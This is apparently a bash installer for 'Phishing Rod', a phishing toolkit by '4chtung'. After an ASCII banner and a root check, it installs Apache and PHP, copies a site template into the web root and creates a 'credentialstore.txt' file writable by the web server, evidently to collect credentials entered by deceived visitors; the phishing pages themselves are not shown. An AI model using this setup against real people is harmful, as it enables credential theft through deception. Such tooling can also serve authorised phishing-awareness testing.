#!/bin/bash

#PHISHING ROD
#Written By 4chtung
#Version V0.1 Alpha

# HOLY CRAP COLOUR!
ESC="\e["
RESET=$ESC"39m"

RED=$ESC"31m"
BLUE=$ESC"94m"
GREEN=$ESC"32m"

BGRED=$ESC"101m"$ESC"30m"
BGRESET=$ESC"49m"$ESC"39m"

# Other Variables


#----------------------------

function fancyintro {

echo
cat << "EOF"

██████╗ ██╗  ██╗██╗███████╗██╗  ██╗██╗███╗   ██╗ ██████╗     ██████╗  ██████╗ ██████╗            ,-.
██╔══██╗██║  ██║██║██╔════╝██║  ██║██║████╗  ██║██╔════╝     ██╔══██╗██╔═══██╗██╔══██╗       O  /   `.
██████╔╝███████║██║███████╗███████║██║██╔██╗ ██║██║  ███╗    ██████╔╝██║   ██║██║  ██║       <\/      `.
██╔═══╝ ██╔══██║██║╚════██║██╔══██║██║██║╚██╗██║██║   ██║    ██╔══██╗██║   ██║██║  ██║        |*        `.
██║     ██║  ██║██║███████║██║  ██║██║██║ ╚████║╚██████╔╝    ██║  ██║╚██████╔╝██████╔╝       / \          `.
╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝     ╚═╝  ╚═╝ ╚═════╝ ╚═════╝       /  /            `<PASSWORD>

EOF
echo "Phishing Rod --- 4chtung (@FriedSec)"

echo
}


fancyintro

## CHECK FOR ROOT ACCESS

if (( $EUID != 0 )); then
    echo -e "${RED}ERROR!!!----YOU ARE NOT ROOT!----ERROR!!!${RESET}"
    echo -e "${RED}-----------PLEASE RUN AS ROOT!-----------${RESET}"
    echo -e "${RED}--OR SUDO OR WHATEVER I'M NOT YOUR MUM!--${RESET}"
    echo -e "${RED}ERROR!!!----YOU ARE NOT ROOT!----ERROR!!!${RESET}"
    echo
    exit
fi

## UPDATE APT FILES

apt-get update

## INSTALL APACHE2 / PHP / ANYTHING ELSE WE NEED
apt-get install php libapache2-mod-php apache2 -y

## For Good Measure, Restart APACHE2
service apache2 restart

## Install Site Template to Apache Folder
cp -R site/* /var/www/html/

## Create Credential File
touch /var/www/html/credentialstore.txt

## Give www-data access to the file.
chown www-data /var/www/html/credentialstore.txt
